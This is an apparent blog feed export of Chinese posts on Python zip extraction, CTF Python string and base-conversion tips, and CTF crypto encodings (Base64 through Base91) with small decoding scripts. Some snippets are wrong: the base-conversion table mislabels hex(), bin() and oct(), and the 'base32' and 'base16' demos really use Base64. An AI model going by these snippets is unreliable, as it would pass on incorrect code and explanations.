zipfile.ZipFile(&#39;secret.zip&#39;, &#39;r&#39;) as pwd_zip:</span><br><span class="line">...     # 从加密的文档提取数据</span><br><span class="line">...     pwd_zip.extractall(path&#x3D;&#39;extract_dir&#39;, pwd&#x3D;&#39;Quish3@o&#39;)</span><br></pre></td></tr></table></figure><p>将以读取模式打开 <code>secret.zip</code> 存档。 密码提供给 <code>.extractall()</code> ，并且压缩文件内容被提取到 <code>extract_dir</code> 。 由于with语句，在完成提取后，存档文件会自动关闭。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Python文件操作&quot;&gt;&lt;a href=&quot;#Python文件操作&quot; class=&quot;headerlink&quot; title=&quot;Python文件操作&quot;&gt;&lt;/a&gt;Python文件操作&lt;/h3&gt;&lt;h4 id=&quot;Python中文件数据的读和写&quot;&gt;&lt;a href=&quot;#Python</summary>
      
    
    
    
    <category term="Python学习" scheme="http://s1eady.top/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="Python" scheme="http://s1eady.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>CTF-python</title>
    <link href="http://s1eady.top/2018/11/30/CTF-Python/"/>
    <id>http://s1eady.top/2018/11/30/CTF-Python/</id>
    <published>2018-11-29T18:13:29.000Z</published>
    <updated>2020-10-16T11:36:24.414Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF中的Python"><a href="#CTF中的Python" class="headerlink" title="CTF中的Python"></a>CTF中的Python</h1><h2 id="str-与-bytes-之间的类型转换"><a href="#str-与-bytes-之间的类型转换" class="headerlink" title="str 与 bytes 之间的类型转换"></a>str 与 bytes 之间的类型转换</h2><p>str 与 bytes 之间的类型转换如下：</p><ul><li>str ⇒ bytes：<code>bytes(s, encoding=&#39;utf8&#39;)</code></li><li>bytes ⇒ str：<code>str(b, encoding=&#39;utf-8&#39;)</code></li><li>str.encode(s)</li><li>bytes.decode(b)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># bytes object</span></span><br><span class="line"> b = <span class="string">b&quot;example&quot;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment"># str object</span></span><br><span class="line"> s = <span class="string">&quot;example&quot;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment"># str to bytes</span></span><br><span class="line"> bytes(s, encoding = <span class="string">&quot;utf8&quot;</span>)</span><br><span class="line"></span><br><span class="line"> <span class="comment"># bytes to str</span></span><br><span class="line"> str(b, encoding = <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"> <span class="comment"># an alternative method</span></span><br><span class="line"> <span class="comment"># str to bytes</span></span><br><span class="line"> str.encode(s)</span><br><span class="line"></span><br><span class="line"> <span class="comment"># bytes to str</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">二进制转换到十进制 int（<span class="string">&#x27;a&#x27;</span>，<span class="number">2</span>)</span><br><span class="line">八进制转换十六进制 hex(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">十进制转换二进制  bin(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">十六进制转换八进制 oct(<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="int函数"><a href="#int函数" class="headerlink" title="int函数"></a>int函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&quot;0x65&quot;</span><br><span class="line">print(int(a,16))</span><br><span class="line">b&#x3D;&quot;0o157&quot;</span><br><span class="line">print(int(b,8))</span><br><span class="line">c&#x3D;&quot;0o157&quot;</span><br><span class="line">print(int(c,8))</span><br><span class="line">d&#x3D;&quot;87&quot;</span><br><span class="line">print(int(d))</span><br></pre></td></tr></table></figure><h3 id="十六进制转化"><a href="#十六进制转化" class="headerlink" title="十六进制转化"></a>十六进制转化</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">str1=<span class="number">36427215695199</span></span><br><span class="line">a=hex(str1)</span><br><span class="line">print(a)</span><br><span class="line">b=a.strip(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">c=binascii.unhexlify(b)</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure><p>1)hex()会进行进制转换，转换结果会带有0x。而且hex只会处理数字，不能处理字符串。<br>2)unhexlify()会将十六进制解码，不仅会处理数字，还会处理字符串。</p><h3 id="二进制转换"><a href="#二进制转换" class="headerlink" title="二进制转换"></a>二进制转换</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">g=<span class="string">&#x27;0110110101111001011011100110000101101101011001010110100101110011011010110110010101111001001000010010000100100001011010000110100001101000&#x27;</span></span><br><span class="line">b=<span class="string">&#x27;&#x27;</span></span><br><span class="line">e=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(g)):</span><br><span class="line">e+=<span class="number">1</span></span><br><span class="line">print(e)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">136</span>,<span class="number">8</span>):</span><br><span class="line">b+=chr(int(g[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure><p>二进制八个一组转化为十进制，转换为ascii</p><h3 id="八进制转化"><a href="#八进制转化" class="headerlink" title="八进制转化"></a>八进制转化</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&#x27;146154141147173110141166145137171060125137120171137163143162151160164137117164143137124157137124145156137101163143151151041175&#x27;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">l=len(a)</span><br><span class="line">print(a)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,l,<span class="number">3</span>):</span><br><span class="line">flag+=chr(int(a[i:i+<span class="number">3</span>],<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> (flag)</span><br></pre></td></tr></table></figure><h2 id="常用小trip"><a href="#常用小trip" class="headerlink" title="常用小trip"></a>常用小trip</h2><h3 id="startswith"><a href="#startswith" class="headerlink" title="startswith()"></a>startswith()</h3><p>函数：startswith()</p><p>作用：判断字符串是否以指定字符或子字符串开头。</p><p>语法：<code>string.startswith(str, beg=0,end=len(string))</code></p><p>返回值：如果检测到字符串，则返回True，否则返回False。默认空字符为True。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">&#x27;hello good boy steady&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> s.startswith(<span class="string">&#x27;h&#x27;</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> s.startswith(<span class="string">&#x27;hel&#x27;</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> s.startswith(<span class="string">&#x27;h&#x27;</span>,<span class="number">4</span>)</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> s.startswith(<span class="string">&#x27;go&#x27;</span>,<span class="number">6</span>,<span class="number">8</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#匹配空字符集</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> s.startswith(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="comment">#匹配元组</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> s.startswith((<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;h&#x27;</span>))</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><h3 id="大小写转化"><a href="#大小写转化" class="headerlink" title="大小写转化"></a>大小写转化</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">steady_dic=<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">steady_dic1=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">print(steady_dic.lower())</span><br><span class="line">print(steady_dic1.upper())</span><br></pre></td></tr></table></figure><h3 id="大小写字母"><a href="#大小写字母" class="headerlink" title="大小写字母"></a>大小写字母</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">words1 = list(string.ascii_uppercase)</span><br><span class="line">print(words1)</span><br><span class="line"></span><br><span class="line">words2 = list(string.ascii_lowercase)</span><br><span class="line">print(words2)</span><br><span class="line"></span><br><span class="line">words3 = list(string.ascii_letters)</span><br><span class="line">print(words3)</span><br></pre></td></tr></table></figure><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>去除空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady_str&#x3D;re.sub(r&quot;  &quot;,&quot;&quot;,steady_str)</span><br></pre></td></tr></table></figure><p>提取某些字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady_str&#x3D;re.findall(r&#39;&lt;(.*?)&lt;&#39;,steady_str)</span><br></pre></td></tr></table></figure><h2 id="enumerate"><a href="#enumerate" class="headerlink" title="enumerate"></a>enumerate</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iv&#x3D;[2,3,7,5,13,12,9,1,8,10,4,11,6]</span><br><span class="line">for x,y in enumerate(iv):</span><br><span class="line">    print(x,y)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0 2</span><br><span class="line">1 3</span><br><span class="line">2 7</span><br><span class="line">3 5</span><br><span class="line">4 13</span><br><span class="line">5 12</span><br><span class="line">6 9</span><br><span class="line">7 1</span><br><span class="line">8 8</span><br><span class="line">9 10</span><br><span class="line">10 4</span><br><span class="line">11 11</span><br><span class="line">12 6</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF中的Python&quot;&gt;&lt;a href=&quot;#CTF中的Python&quot; class=&quot;headerlink&quot; title=&quot;CTF中的Python&quot;&gt;&lt;/a&gt;CTF中的Python&lt;/h1&gt;&lt;h2 id=&quot;str-与-bytes-之间的类型转换&quot;&gt;&lt;a href=</summary>
      
    
    
    
    <category term="CTF-密码" scheme="http://s1eady.top/categories/CTF-%E5%AF%86%E7%A0%81/"/>
    
    
    <category term="CTF-密码" scheme="http://s1eady.top/tags/CTF-%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>CTF-密码</title>
    <link href="http://s1eady.top/2018/11/22/CTF-%E5%AF%86%E7%A0%81%E9%A2%98/"/>
    <id>http://s1eady.top/2018/11/22/CTF-%E5%AF%86%E7%A0%81%E9%A2%98/</id>
    <published>2018-11-22T00:24:33.000Z</published>
    <updated>2020-10-16T11:36:25.436Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF密码题总结"><a href="#CTF密码题总结" class="headerlink" title="CTF密码题总结"></a>CTF密码题总结</h1><h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Base64编码是基于64个字符A-Z,a-z，0-9，+，/的编码方式，因为2的6次方正好为64，所以就用6bit就可以表示出64个字符，eg:000000对应A，000001对应B。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/1656180d4f070bcb.jpeg" alt="1656180d4f070bcb"></p><p>每三个字符一组</p><p>1、每个字符转成八位二进制，一共是24位二进制。</p><p>2、24四位二进制转化成四个六位的二进制。</p><p>3、四个六位的二进制转化成十进制。</p><p>4、对应base64编码表将十进制转化成对应的字符。</p><p>特点</p><ul><li><p>标准Base64只有64个字符（英文大小写、数字和+、/）以及用作后缀等号；</p></li><li><p>Base64是把3个字节变成4个可打印字符，所以Base64编码后的字符串一定能被4整除（不算用作后缀的等号）；</p></li><li><p>等号一定用作后缀，且数目一定是0个、1个或2个。这是因为如果原文长度不能被3整除，Base64要在后面添加0凑齐3n位。为了正确还原，添加了几个0就加上几个等号。显然添加等号的数目只能是0、1或2；</p></li><li><p>严格来说Base64不能算是一种加密，只能说是编码转换。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">print(<span class="string">&quot;制作base64编码表：&quot;</span>)</span><br><span class="line">string_temp =<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">base64_dict = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">    base64_dict[i] = string_temp[i]</span><br><span class="line">print(base64_dict)</span><br><span class="line">s=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">a=<span class="string">&#x27;&#x27;</span></span><br><span class="line">string=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    a+=str(ord(i))</span><br><span class="line">    b=bin(int(a))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">while</span> len(b)!=<span class="number">8</span>:</span><br><span class="line">        a=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">        b=a+b</span><br><span class="line">    string+=b</span><br><span class="line">print(<span class="string">&quot;每三个字符转换成二进制:&quot;</span>+string)</span><br><span class="line">h=<span class="string">&quot;&quot;</span></span><br><span class="line">hb=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">25</span>,<span class="number">6</span>):</span><br><span class="line">    h=string[i:i+<span class="number">6</span>]</span><br><span class="line">    hb.append(h)</span><br><span class="line">print(<span class="string">&quot;每三个八位二进制转化成四个六位二进制：&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hb:</span><br><span class="line">    print(i)</span><br><span class="line">print(<span class="string">&quot;每六位二进制转化成十进制：&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hb:</span><br><span class="line">    <span class="keyword">while</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">in</span> hb:</span><br><span class="line">        hb.remove(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    print(int(i,<span class="number">2</span>))</span><br><span class="line">bs=<span class="string">&quot;&quot;</span></span><br><span class="line">print(<span class="string">&quot;十进制对应base64表转化：&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hb:</span><br><span class="line">    i=int(i,<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> int(i)&gt;<span class="number">64</span>:</span><br><span class="line">        i=i%<span class="number">64</span></span><br><span class="line">    print(base64_dict[i])</span><br><span class="line">    bs+=base64_dict[i]</span><br><span class="line">print(bs)</span><br></pre></td></tr></table></figure><h3 id="Python与Base64"><a href="#Python与Base64" class="headerlink" title="Python与Base64"></a>Python与Base64</h3><h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><p><code>b64encode</code>：b64encode 的参数 s 的类型必须是字节包（bytes）。</p><p><code>b64decode</code>：b64decode 的参数 s 可以是字节包（bytes），也可以是字符串（str）。</p><h4 id="编码字符串实例"><a href="#编码字符串实例" class="headerlink" title="编码字符串实例"></a>编码字符串实例</h4><h5 id="字符长度为能被3整除"><a href="#字符长度为能被3整除" class="headerlink" title="字符长度为能被3整除"></a>字符长度为能被3整除</h5><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201010161350712.png" alt="image-20201010161350712"></p><h5 id="字符串长度不能被3整除"><a href="#字符串长度不能被3整除" class="headerlink" title="字符串长度不能被3整除"></a>字符串长度不能被3整除</h5><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201010161406321.png" alt="image-20201010161406321"></p><h4 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">S = <span class="string">b&#x27;I like Python&#x27;</span></span><br><span class="line">steady = base64.b64encode(S)</span><br><span class="line">print(str(steady,encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">S = <span class="string">&#x27;SSBsaWtlIFB5dGhvbg==&#x27;</span></span><br><span class="line">steady = base64.b64decode(S)</span><br><span class="line">print(str(steady,encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><h4 id="base32、16"><a href="#base32、16" class="headerlink" title="base32、16"></a>base32、16</h4><h5 id="base32"><a href="#base32" class="headerlink" title="base32"></a>base32</h5><p>Base32使用了ASCII编码中可打印的<strong>32</strong>个字符**(大写字母A-Z和数字2~7)**对任意字节数据进行编码.Base32将串起来的二进制数据按照5个二进制位分为一组,由于传输数据的单位是字节(即8个二进制位).所以分割之前的二进制位数是40的倍数(40是5和8的最小公倍数).如果不足40位,则在编码后数据补充<code>=</code>,一个<code>=</code>相当于一个组(5个二进制位),编码后的数据是原先的五分之八倍。末尾最多有6个<code>=</code>。</p><h5 id="base16"><a href="#base16" class="headerlink" title="base16"></a>base16</h5><p>Base16编码就是将ASCII字符集中可打印的字符**(数字0-9和字母A-F)**对应的二进制字节数据进行编码，不会出现<code>=</code>，数据量是原先的两倍。</p><h5 id="base36"><a href="#base36" class="headerlink" title="base36"></a>base36</h5><p>Base36包含0~9的数字，加上所有26个字母，不区分大小写，不包含任何标点，所有的字母要不全大写，要不全小写。所以加起来就是 “0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ”,或者”0123456789abcdefghijklmnopqrstuvwxyz“</p><p><strong>特征特点</strong>：密文由36个字符（0-9,a-z）组成，加密仅支持整数数字，解密仅支持字符串，不支持中文<br>密文由36个字符（0-9,A-Z）</p><h5 id="base58"><a href="#base58" class="headerlink" title="base58"></a>base58</h5><p>base58采用的字符集为“123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ”，从这不难看出，Base58是纯数字与字母组成而且去掉了容易引起视觉混淆的字符（0：数字零，O：大写O，I：大写i，l:小写L）。9个数字+49个字母=58个。由于没有特殊字符所以在采用鼠标双击或移动设备选择时可以自动识别全选。Base58本身就是URLSafe。Base64的URFSafe模式虽然已经对URL支持的比较好，但UUID中还是包含“-或_”。目前流行的比特币，采用的就是Base58Check编码，是在Base58基础上又增加了安全效验机制。</p><p><strong>特征特点</strong>：<br>Base58是用于Bitcoin中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址，Base58不使用数字”0”，字母大写”O”，字母大写”I”，和字母小写”l”，以及”+”和”/”符号</p><h5 id="base62"><a href="#base62" class="headerlink" title="base62"></a>base62</h5><p>同样的还有 base62编码，就是26个字母的大小写再加上0-9，一共62个字符。</p><p>相比于base64只是去掉了两个在网络上不便传输的符号</p><p><strong>特征特点</strong>：密文由62字符（0-9，a-z，A-Z）组成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8nCDq36gzGn8hf4M2HJUsn4aYcYRBSJwj4aE0hbgpzHb4aHcH1zzC9C3IL</span><br></pre></td></tr></table></figure><h5 id="base91"><a href="#base91" class="headerlink" title="base91"></a>base91</h5><p><strong>特征特点</strong>：密文由91个字符（0-9，a-z，A-Z,!#$%&amp;()*+,./:;&lt;=&gt;?@[]^_`{|}~”）组成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">print(<span class="string">&quot;base64:&quot;</span>)</span><br><span class="line">encode64 = base64.b64encode(<span class="string">b&#x27;I love you&#x27;</span>)</span><br><span class="line">decode64 = base64.b64decode(<span class="string">b&#x27;SSBsb3ZlIHlvdQ==&#x27;</span>)</span><br><span class="line">print(encode64)</span><br><span class="line">print(decode64)</span><br><span class="line">print(<span class="string">&quot;base32:&quot;</span>)</span><br><span class="line">encode32 = base64.b64encode(<span class="string">b&#x27;I love you&#x27;</span>)</span><br><span class="line">decode32 = base64.b64decode(<span class="string">b&#x27;SSBsb3ZlIHlvdQ==&#x27;</span>)</span><br><span class="line">print(encode32)</span><br><span class="line">print(decode32)</span><br><span class="line">print(<span class="string">&quot;base16:&quot;</span>)</span><br><span class="line">encode16 = base64.b64encode(<span class="string">b&#x27;I love you&#x27;</span>)</span><br><span class="line">decode16 = base64.b64decode(<span class="string">b&#x27;SSBsb3ZlIHlvdQ==&#x27;</span>)</span><br><span class="line">print(encode16)</span><br><span class="line">print(decode16)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">base64:</span><br><span class="line"><span class="string">b&#x27;SSBsb3ZlIHlvdQ==&#x27;</span></span><br><span class="line"><span class="string">b&#x27;I love you&#x27;</span></span><br><span class="line">base32:</span><br><span class="line"><span class="string">b&#x27;SSBsb3ZlIHlvdQ==&#x27;</span></span><br><span class="line"><span class="string">b&#x27;I love you&#x27;</span></span><br><span class="line">base16:</span><br><span class="line"><span class="string">b&#x27;SSBsb3ZlIHlvdQ==&#x27;</span></span><br><span class="line"><span class="string">b&#x27;I love you&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="字符串逆序"><a href="#字符串逆序" class="headerlink" title="字符串逆序"></a>字符串逆序</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady_str&#x3D;&quot;galf&#123;Lsklth_jxih_guxz_jsgtexp&#125;&quot;</span><br><span class="line">print(steady_str[::-1])</span><br></pre></td></tr></table></figure><h2 id="进制转化"><a href="#进制转化" class="headerlink" title="进制转化"></a>进制转化</h2><p>两个一组转化为十六进制然后在转化为ascii</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&#x27;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1e6b3e3b9e4b3b7b7e2b6b1e4b2b6b9e2b1b1b3b3b7e6b3b3b0e3b9b3b5e6fd&#x27;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> len(str1):</span><br><span class="line">print(len(str1))</span><br><span class="line">flag+=chr(int(str1[:<span class="number">2</span>],<span class="number">16</span>)%<span class="number">128</span>)</span><br><span class="line">str1=str1[<span class="number">2</span>:]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>字符串分割</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&quot;cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc&#123;bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv&#125;&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">print(str1[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,len(str1),<span class="number">5</span>):</span><br><span class="line">flag+=str1[i]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>混合进制解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="string">&#x27;d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 